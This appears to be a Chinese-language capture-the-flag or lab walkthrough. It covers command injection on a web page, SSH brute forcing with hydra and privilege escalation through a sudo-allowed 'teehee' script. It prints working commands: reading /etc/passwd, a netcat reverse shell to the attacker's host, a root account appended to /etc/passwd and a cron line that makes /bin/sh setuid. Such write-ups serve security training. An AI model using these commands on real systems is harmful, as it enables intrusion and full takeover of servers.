# **04 命令注入**

进入网页之后可以看到，居然是可以执行linux命令

![](../Images/101395104fb002308969986e19ee78df.png)

既然如此，用BurpSuite拦截下

![](../Images/c2e9a324fe209926194db85b994856af.png)

可以看到页面确实在往后台传递命令，那么这里存在命令注入漏洞

将 ls+-l 修改为 cat+/etc/passwd ，获取下服务器密码

![](../Images/0df1356c48255d3c8128935c94b31938.png)

可以看到直接获取了服务器的用户名

![](../Images/a8845d6bd63fc5122351e3d6b1a0bd92.png)

将有用的提取出来

```
#服务器用户名
charles:x:1001:1001:Charles,,,:/home/charles:/bin/bash
jim:x:1002:1002:Jim,,,:/home/jim:/bin/bash
sam:x:1003:1003:Sam,,,:/home/sam:/bin/bash
```

既然可以执行命令，那直接反弹shell

```
nc+192.168.31.81+1234+\-e+/bin/bash
```

![](../Images/78a8b0e6cfc8ae70b6ac25fe22f3f403.png)

在kali上监听1234端口

![](../Images/8d104c7dde0f2fbdfd5ba5b5005a2160.png)

攻击机上已经获取到了shell

```
#获取完全交互的shellpython \-c 'import pty;pty.spawn("/bin/sh")'
```

链接上靶机之后，看下服务器上面都有什么，最后发现只有jim文件下有类似密码备份


在创建个文件，用来存储服务器的用户名

# **05 ssh爆破**

既然有了用户名列表，也有了密码列表，那么就开始对服务器进行爆破

```
#在kali中使用hydra进行爆破
hydra \-L user.txt \-P pass.txt  ssh://192.168.31.145 \-s  22
```

![](../Images/a8ed11f18f21d85e8c9288bbd119a984.png)

可以看到账号是: jim ,密码是: jibril04

使用ssh远程登录jim的账号

```
ssh jim@192.168.31.145
```

![](../Images/4efd1458c88dd48d31fa35bf3100b760.png)

登录成功

# **07 提权**

执行

```
sudo -l
```

![](../Images/7d8d1b69e54f7609daaaf8cd7fd1d8a7.png)

可以看到一个root权限无密码执行的脚本

可以通过这个脚本进行提权

这个脚本具体是做什么用的？它主要是把内容写入一个文件的中的末尾

既然知道脚本的功能，那么这个地方就有两种办法提取

第一种，创建一个具有root权限的用户

```
#创建新的root权限账户
echo "admin::0:0:::/bin/bash" | sudo teehee \-a /etc/passwd
```

  

第二种，定时任务

```
echo "\* \* \* \* \* root chmod 4777 /bin/sh" | sudo teehee \-a /etc/crontab

/bin/sh
```

![](../Images/544790278205c162970cd12d5ca88ad7.png)

提权成功

最后查看root目录下的目标

![](../Images/00710631f1b4111418c515c56313289b.png)
